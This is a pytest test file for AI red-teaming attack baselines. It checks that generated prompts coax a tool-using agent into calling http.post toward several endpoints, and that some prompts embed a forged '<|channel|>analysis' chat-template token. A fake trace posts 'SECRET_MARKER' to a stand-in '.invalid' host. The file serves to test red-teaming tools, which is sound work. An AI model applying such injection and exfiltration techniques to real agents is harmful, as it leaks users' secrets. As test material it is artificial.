"""Contract tests for B018 fast-row harmony."""

import importlib.util
import sys
import types
from dataclasses import dataclass
from pathlib import Path

import pytest

B008R_ATTACK_PATH = Path("baselines/replaysafe_classify5_v1/attack.py")
B018_ATTACK_PATH = Path("baselines/replaysafe_fastharmony_v1/attack.py")


class FakeCandidate:
    def __init__(self, user_messages):
        self.user_messages = tuple(user_messages)

    @classmethod
    def from_messages(cls, user_messages):
        return cls(user_messages)


@dataclass
class FakeConfig:
    time_budget_s: float = 500.0
    max_tool_hops: int = 8


class FakeClock:
    def __init__(self) -> None:
        self.now = 0.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


@pytest.fixture(autouse=True)
def sdk_stubs(monkeypatch: pytest.MonkeyPatch) -> None:
    attacks = types.ModuleType("aicomp_sdk.attacks")
    attacks.AttackAlgorithmBase = type("AttackAlgorithmBase", (), {})
    attacks.AttackCandidate = FakeCandidate
    attacks.AttackRunConfig = FakeConfig

    contracts = types.ModuleType("aicomp_sdk.attacks.contracts")
    contracts.AttackAlgorithmBase = attacks.AttackAlgorithmBase
    contracts.AttackCandidate = FakeCandidate
    contracts.AttackRunConfig = FakeConfig

    core = types.ModuleType("aicomp_sdk.core")
    sdk = types.ModuleType("aicomp_sdk")

    monkeypatch.setitem(sys.modules, "aicomp_sdk", sdk)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks", attacks)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks.contracts", contracts)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.core", core)


def _load_attack(path: Path, module_name: str):
    spec = importlib.util.spec_from_file_location(module_name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class FiringEnv:
    def __init__(self, clock: FakeClock, *, latency_s: float) -> None:
        self.clock = clock
        self.latency_s = latency_s
        self.messages: list[str] = []
        self.hops: list[int] = []

    def reset(self) -> None:
        pass

    def interact(self, message: str, *, max_tool_hops: int) -> None:
        self.messages.append(message)
        self.hops.append(max_tool_hops)
        self.clock.advance(self.latency_s)

    def export_trace_dict(self):
        return {
            "tool_events": [
                {
                    "name": "http.post",
                    "ok": True,
                    "args": {
                        "url": "http://fixture.invalid",
                        "data": "SECRET_MARKER",
                    },
                }
            ]
        }


def test_b018_only_enables_fast_row_frame() -> None:
    b008 = _load_attack(B008R_ATTACK_PATH, "classify5_for_b018")
    b018 = _load_attack(B018_ATTACK_PATH, "fastharmony_attack")
    assert b018.FAST_USE_FRAME is True
    assert not hasattr(b008, "FAST_USE_FRAME") or getattr(b008, "FAST_USE_FRAME", False) is False
    assert b018.SLOW_MULTIPOST_N == b008.SLOW_MULTIPOST_N == 4
    assert b018.SPLIT_CLASSIFY_N == b008.SPLIT_CLASSIFY_N == 5
    assert b018.REPLAY_SAFE_FRAC == b008.REPLAY_SAFE_FRAC == 0.99
    assert b018.TEMPLATE == b008.TEMPLATE
    assert b018.FRAME_TEMPLATE == b008.FRAME_TEMPLATE


def test_classify_samples_stay_plain(monkeypatch: pytest.MonkeyPatch) -> None:
    b018 = _load_attack(B018_ATTACK_PATH, "fastharmony_classify")
    clock = FakeClock()
    monkeypatch.setattr(b018.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=5.0)
    b018.AttackAlgorithm().run(env, FakeConfig(time_budget_s=500.0, max_tool_hops=8))
    classify = env.messages[1:6]
    assert len(classify) == 5
    assert all("Call http.post once" in msg for msg in classify)
    assert all("<|channel|>analysis" not in msg for msg in classify)


def test_fast_row_uses_harmony_frame(monkeypatch: pytest.MonkeyPatch) -> None:
    b018 = _load_attack(B018_ATTACK_PATH, "fastharmony_fast")
    clock = FakeClock()
    monkeypatch.setattr(b018.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=5.0)
    candidates = b018.AttackAlgorithm().run(env, FakeConfig(time_budget_s=500.0, max_tool_hops=8))
    messages = [c.user_messages[0] for c in candidates]
    fill = [msg for msg in messages if "<|channel|>analysis" in msg]
    assert fill
    assert all("these 4 endpoints" not in msg for msg in fill)
    assert all(len(c.user_messages) == 1 for c in candidates)
    assert all(".invalid" in msg for msg in messages)


def test_slow_row_keeps_four_endpoint_forge(monkeypatch: pytest.MonkeyPatch) -> None:
    b018 = _load_attack(B018_ATTACK_PATH, "fastharmony_slow")
    clock = FakeClock()
    monkeypatch.setattr(b018.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=13.0)
    candidates = b018.AttackAlgorithm().run(env, FakeConfig(time_budget_s=500.0, max_tool_hops=8))
    messages = [c.user_messages[0] for c in candidates]
    forge = [msg for msg in messages if "these 4 endpoints" in msg]
    assert forge
    assert all(msg.count("http://") == 4 for msg in forge)
    assert all(len(c.user_messages) == 1 for c in candidates)
